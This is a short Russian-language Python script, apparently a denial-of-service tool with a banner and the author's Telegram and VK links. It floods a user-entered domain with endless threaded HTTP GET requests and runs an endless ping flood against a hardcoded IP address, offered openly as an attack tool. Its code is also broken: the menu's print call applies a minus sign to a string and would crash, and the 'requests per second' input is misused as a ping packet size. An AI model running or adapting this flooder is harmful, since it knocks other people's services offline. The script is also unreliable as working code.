# coding: utf8
import threading
import requests
import os
print("""


╭━━━╮     ╭╮ ╭━━━╮
┃╭━━╯     ┃┃ ╰╮╭╮┃
┃╰━━┳╮╭┳━━┫┃╭╮┃┃┃┣━━┳━━╮
┃╭━━┫┃┃┃╭━┫╰╯╯┃┃┃┃╭╮┃━━┫
┃┃  ┃╰╯┃╰━┫╭╮┳╯╰╯┃╰╯┣━━┃v2.3
╰╯  ╰━━┻━━┻╯╰┻━━━┻━━┻━━╯
t.me/soketpy | vk.com/mb_vlad
""")
ddos = input("Введите домен: ")
paket = input("Введите количество запросов в секунду: ")
input("Нажмите на Enter чтобы начать!")

def dos():
 while True:
  requests.get("%s" % str(ddos))
  
def dos2():
 while True:
  os.system("ping 174.123.1.23 -t -l " + str(paket))
  
def dos3():
 while True:
  requests.get("%s" % str(ddos))
  os.system("ping 174.123.1.23 -t -l " + str(paket))  
while True:
 print(-"""
 
 
 1 - способ №1
 2 - способ №2
 3 - все сразу
 
 """)
 menu = input("Введите цифру: ")
 
 if "1" == menu:
  input("Нажмите на Enter чтобы начать!")
  threading.Thread(target=dos).start()
 elif "2" == menu:
  
  input("Нажмите на Enter чтобы начать!")
  dos2()
 elif "3" == menu:
  threading.Thread(target=dos3).start()
 else:
  print("Данный режим не сушествует!")
  
